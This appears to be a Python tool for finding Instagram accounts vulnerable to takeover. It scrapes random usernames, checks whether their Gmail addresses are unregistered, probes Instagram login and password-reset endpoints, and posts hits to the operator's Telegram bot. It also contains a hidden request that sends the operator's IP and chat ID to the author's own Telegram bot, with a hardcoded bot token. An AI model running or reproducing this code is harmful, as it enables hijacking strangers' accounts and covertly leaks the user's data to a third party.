import os
import requests
import time
import os
import threading
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)
import webbrowser
os.system('clear')
try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
r = requests.session()
os.system('clear')
#------------------------------[الالوان]------------------------------
Z = '\033[1;31m' #احمر
A = '\x1b[2;34m'
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ip = requests.get("https://api.ipify.org").text
q = '\033[1;30m'
w = '\033[1;31m'
e = '\033[1;32m'
r = '\033[1;33m'
t = '\033[1;34m'
y = '\033[1;35m'
u = '\033[1;36m'
i = '\033[1;37m'

o = '\033[2;30m'
p = '\033[2;31m'
a = '\033[2;32m'
s = '\033[2;33m'
d = '\033[2;34m'
f = '\033[2;35m'
g = '\033[2;36m'
h = '\033[2;37m'

j = '\033[3;30m'
k = '\033[3;31m'
l = '\033[3;32m'
z = '\033[3;33m'
x = '\033[3;34m'
c = '\033[3;35m'
v = '\033[3;36m'
b = '\033[3;37m'

ll = '\033[4;30m'#رصاصي تحتها خط
rr = '\033[4;31m'#احمر جديد تحتها خط
gg = '\033[4;32m'#اخضر جديدة تحتها خط
yy = '\033[4;33m'#اصفر جديدة تحتها خط
bb = '\033[4;34m' #ازرق جديدة تحتها خط
pp = '\033[4;35m' #بنفسجي جديدة تحتها خط
mm = '\033[4;36m' #سمائي جديدة تحتها خط
aa = '\033[4;37m' #ابيض جديدة تحتها خط

lll = '\033[7;100m'#رصاصي جديدة
rrr = '\033[7;101m'#احمر جديد
ggg = '\033[7;102m'#اخضر جديدة
yyy = '\033[7;103m'#اصفر جديدة
bbb = '\033[7;104m' #ازرق جديدة
ppp = '\033[7;105m' #بنفسجي جديدة
mmm = '\033[7;106m' #سمائي جديدة
aaa = '\033[7;107m' #ابيض جديدة

llll = '\033[8;100m'#لون رصاصي تغطية كلمات
rrrr = '\033[8;101m'#احمر جديد تغطية كلمات
gggg = '\033[8;102m'#اخضر جديدة تغطية كيمات
yyyy = '\033[8;103m'#اصفر جديدة تغطية كامات
bbbb = '\033[8;104m' #ازرق جديدة تغطية كلمات
pppp = '\033[8;105m' #بنفسجي جديدة تغطية كلمات
mmmm = '\033[8;106m' #سمائي جديدة تغطية كلمات
aaaa = '\033[8;107m' #ابيض جديدة تغطية كلمات

lllll = '\033[11;100m'#رصاصي جديد للتشفير
rrrrr = '\033[11;101m'#احمر جديد للتشفير
ggggg = '\033[11;102m'#اخضر جديد للتشفير
yyyyy = '\033[11;103m'#اصفر جديد للتشفير
bbbbb = '\033[11;104m' #ازرق جديد للتشفير
ppppp = '\033[11;105m' #بنفسجي جديد للتشفير
mmmmm = '\033[11;106m' #سمائي جديد للتشفير
aaaaa = '\033[11;107m' #ابيض جديد للتشفير

llllll = '\033[30;100m'#رصاصي ورصاصي
rrrrrr = '\033[30;101m'#احمر ورصاصي
gggggg = '\033[30;102m'#اخضر ورصاصي
yyyyyy = '\033[30;103m'#اصفر ورصاصي
bbbbbb = '\033[30;104m' #ازرق ورصاصي
pppppp = '\033[30;105m' #بنفسجي ورصاصي
mmmmmm = '\033[30;106m' #سمائي ورصاصي
aaaaaa = '\033[30;107m' #ابيض ورصاصي

lllllll = '\033[31;100m'#رصاصي واحمر
rrrrrrr = '\033[31;101m'#احمر واحمر
ggggggg = '\033[31;102m'#اخضر واحمر
yyyyyyy = '\033[31;103m'#اصفر واحمر
bbbbbbb = '\033[31;104m' #ازرق واحمر
ppppppp = '\033[31;105m' #بنفسجي واحمر
mmmmmmm= '\033[31;106m' #سمائي واحمر
aaaaaaa = '\033[31;107m' #ابيض واحمر

llllllll = '\033[32;100m'#رصاصي واخضر
rrrrrrrr = '\033[32;101m'#احمر واخضر
gggggggg = '\033[32;102m'#اخضر واخضر
yyyyyyyy = '\033[32;103m'#اصفر واخضر
bbbbbbbb = '\033[32;104m' #ازرق واخضر
pppppppp = '\033[32;105m' #بنفسجي واخضر
mmmmmmmm = '\033[32;106m' #سمائي واخضر
aaaaaaaa = '\033[32;107m' #ابيض واخضر

lllllllll = '\033[33;100m'#رصاصي واصفر
rrrrrrrrr = '\033[33;101m'#احمر واصفر
ggggggggg = '\033[33;102m'#اخضر واصفر
yyyyyyyyy = '\033[33;103m'#اصفر واصفر
bbbbbbbbb = '\033[33;104m' #ازرق واصفر
ppppppppp = '\033[33;105m' #بنفسجي واصفر
mmmmmmmmm = '\033[33;106m' #سمائي واصفر
aaaaaaaaa = '\033[33;107m' #ابيض واصفر

llllllllll = '\033[34;100m'#رصاصي وازرق
rrrrrrrrrr = '\033[34;101m'#احمر وازرق
gggggggggg = '\033[34;102m'#اخضر وازرق
yyyyyyyyyy = '\033[34;103m'#اصفر وازرق
bbbbbbbbbb = '\033[34;104m' #ازرق وازرق
pppppppppp = '\033[34;105m' #بنفسجي وازرق
mmmmmmmmmm = '\033[34;106m' #سمائي وازرق
aaaaaaaaaa = '\033[34;107m' #ابيض وازرق

la = '\033[35;100m'#رصاصي وبنفسجي
ra = '\033[35;101m'#احمر وبنفسجي
ga = '\033[35;102m'#اخضر وبنفسجي
ya = '\033[35;103m'#اصفر وبنفسجي
ba = '\033[35;104m' #ازرق وبنفسجي
pa = '\033[35;105m' #بنفسجي وبنفسجي
ma = '\033[35;106m' #سمائي وبنفسجي
am = '\033[35;107m' #ابيض وبنفسجي

laa = '\033[36;100m'#رصاصي وسمائي
raa = '\033[36;101m'#احمر وسمائي
gaa = '\033[36;102m'#اخضر وسمائي
yaa = '\033[36;103m'#اصفر وسمائي
baa = '\033[36;104m' #ازرق وسمائي
paa = '\033[36;105m' #بنفسجي وسمائي
maa = '\033[36;106m' #سمائي وسمائي
amm = '\033[36;107m' #ابيض وسمائي


laaa = '\033[37;100m'#رصاصي وابيض
raaa = '\033[37;101m'#احمر وابيض
gaaa = '\033[37;102m'#اخضر وابيض
yaaa = '\033[37;103m'#اصفر وابيض
baaa = '\033[37;104m' #ازرق وابيض
paaa = '\033[37;105m' #بنفسجي وابيض
maaa = '\033[37;106m' #سمائي وابيض
ammm = '\033[37;107m' #ابيض وابيض

laaaa = '\033[90;100m'#رصاصي ورصاصي
raaaa = '\033[90;101m'#احمر ورصاصي
gaaaa = '\033[90;102m'#اخضر ورصاصي
yaaaa = '\033[90;103m'#اصفر ورصاصي
baaaa = '\033[90;104m' #ازرق ورصاصي
paaaa = '\033[90;105m' #بنفسجي ورصاصي
maaaa = '\033[90;106m' #سمائي ورصاصي
ammmm = '\033[90;107m' #ابيض ورصاصي

laaaaa = '\033[91;100m'#رصاصي واحمر
raaaaa = '\033[91;101m'#احمر واحمر
gaaaaa = '\033[91;102m'#اخضر واحمر
yaaaaaa = '\033[91;103m'#اصفر واحمر
baaaaa = '\033[91;104m' #ازرق واحمر
paaaaa = '\033[91;105m' #بنفسجي واحمر
maaaaa = '\033[91;106m' #سمائي واحمر
ammmmm = '\033[91;107m' #ابيض واحمر

laaaaaa = '\033[92;100m'#رصاصي واخضر
raaaaaa = '\033[92;101m'#احمر واخضر
gaaaaaa = '\033[92;102m'#اخضر واخضر
yaaaaaa = '\033[92;103m'#اصفر واخضر
baaaaaa = '\033[92;104m' #ازرق واخضر
paaaaaa = '\033[92;105m' #بنفسجي واخضر
maaaaaa = '\033[92;106m' #سمائي واخضر
ammmmmm= '\033[92;107m' #ابيض واخضر

laaaaaaa = '\033[93;100m'#رصاصي واصفر
raaaaaaa = '\033[93;101m'#احمر واصفر
gaaaaaaa = '\033[93;102m'#اخضر واصفر
yaaaaaaa = '\033[93;103m'#اصفر واصفر
baaaaaaa = '\033[93;104m' #ازرق واصفر
paaaaaaa = '\033[93;105m' #بنفسجي واصفر
maaaaaaa = '\033[93;106m' #سمائي واصفر
ammmmmmm = '\033[93;107m' #ابيض واصفر

lu = '\033[94;100m'#رصاصي وازرق
ru = '\033[94;101m'#احمر وازرق
gu = '\033[94;102m'#اخضر وازرق
tu = '\033[94;103m'#اصفر وازرق
bu = '\033[94;104m' #ازرق وازرق
pu = '\033[94;105m' #بنفسجي وازرق
mu = '\033[94;106m' #سمائي وازرق
au = '\033[94;107m' #ابيض وازرق

luu = '\033[95;100m'#رصاصي وبنفسجي
ruu = '\033[95;101m'#احمر وبنفسجي
guu = '\033[95;102m'#اخضر وبنفسجي
yuu = '\033[95;103m'#اصفر وبنفسجي
buu = '\033[95;104m' #ازرق وبنفسجي
puu = '\033[95;105m' #بنفسجي وبنفسجي
muu = '\033[95;106m' #سمائي وبنفسجي
auu = '\033[95;107m' #ابيض وبنفسجي

luuu = '\033[96;100m'#رصاصي وسمائي
ruuu = '\033[96;101m'#احمر وسمائي
guuu = '\033[96;102m'#اخضر وسمائي
yuuu = '\033[96;103m'#اصفر وسمائي
buuu = '\033[96;104m' #ازرق وسمائي
puuu = '\033[96;105m' #بنفسجي وسمائي
muuu = '\033[96;106m' #سمائي وسمائي
auuu = '\033[96;107m' #ابيض وسمائي

luuuu = '\033[97;100m'#رصاصي وابيض
ruuuu = '\033[97;101m'#احمر وابيض
guuuu = '\033[97;102m'#اخضر وابيض
yuuuu = '\033[97;103m'#اصفر وابيض
buuuu = '\033[97;104m' #ازرق وابيض
puuuu = '\033[97;105m' #بنفسجي وابيض
muuuu = '\033[97;106m' #سمائي وابيض
auuuu = '\033[97;107m' #ابيض وابيض


#-------[𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏]------

linux = 'clear'
windows = 'cls'

L = "\033[1;95m"  #ارجواني
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فات

logo = f'''𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏
'''
print(logo)
print('')
username = str(input(f"\033[1;32m[✓]User the account :\033[1;36m"))
password = str(input(f"\033[1;32m[✓]Account password : \033[1;36m"))
os.system([linux, windows][os.name == 'nt'])
url = 'https://www.instagram.com/accounts/login/ajax/'
data = {'username': f'{username}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'}            
headers = {'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'}		
k = requests.post(url,headers=headers,data=data)
if 'authenticated":true' in k.text or 'userId' in k.text:
	print(F+" login True")
	print(L+"="*60)
	os.system([linux, windows][os.name == 'nt'])
	sessionid = k.cookies['sessionid']
        
        

print(logo)
token = input( '\033[1;31m⌯ '  ' \033[1;32m[✓]𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧  ' '»\033[1;36m ')
ID = input('\033[1;31m⌯ ' '\033[1;32m[✓]ID ' ' \033[1;32m» \033[1;36m' )


head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
	 nam = str(rr['graphql']['user']['full_name'])
	 iddd = str(rr['graphql']['user']['id'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 isp = str(rr['graphql']['user']['is_private'])
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	 ree = re.json()
	 dat = ree['date']
	 res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
	 rs =str(res['obfuscated_email'])
	 tlg =(f"""
⋘────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏────━⋙

❖ - 𝖓𝖆𝖒𝖊 : {nam}

❖ - 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : @{user}

❖️ - 𝖊𝖒𝖆𝖎𝖑 : {email}

❖️ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {fols}

❖ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 :{fol}

❖ - 𝖉𝖆𝖙𝖆 𝖆𝖈𝖈𝖔𝖚𝖓𝖙 : {dat}

❖ - 𝖗𝖊𝖘𝖙 :  {rs}

⋘────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏────━⋙

❖ - ᗷY : @nader20090 """)
	 print(F+tlg)
	 print(f'{E}====================================')
	 requests.post(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={ID}&video=https://t.me/nader_4086/6&caption="+str(tlg))
	 ssd = (f'''
⋘────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏────━⋙  
IP : {ip}
ID : {ID}
FOLWRS : {fol}
ACONT : {dat}
MAN : tg://openmessage?user_id={ID}
⋘────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏────━⋙ 
❖ - 𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏
''')
	 requests.get("https://api.telegram.org/bot6349073948:AAE8aD2xxnjF_34dhvNEpji9chyDusL6lSc/sendMessage?chat_id=1350971290&text="+str(ssd))


 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print('\033[1;32mBad Insta \033[1;35m »\033[1;31m {user}  ')
	 
def yahoo(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    check(email,user)
	else:
	    print (f'''\033[1;32mBad Gmail \033[1;35m: \033[1;31m{user} ''')
def users():
 while True:

  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='46789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    if '_' in str(email):

      continue
    else :
      
      yahoo(email,user)
  except IndexError:
   users()
Threads=[] 
for t in range(5):
 x = threading.Thread(target=users)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join()
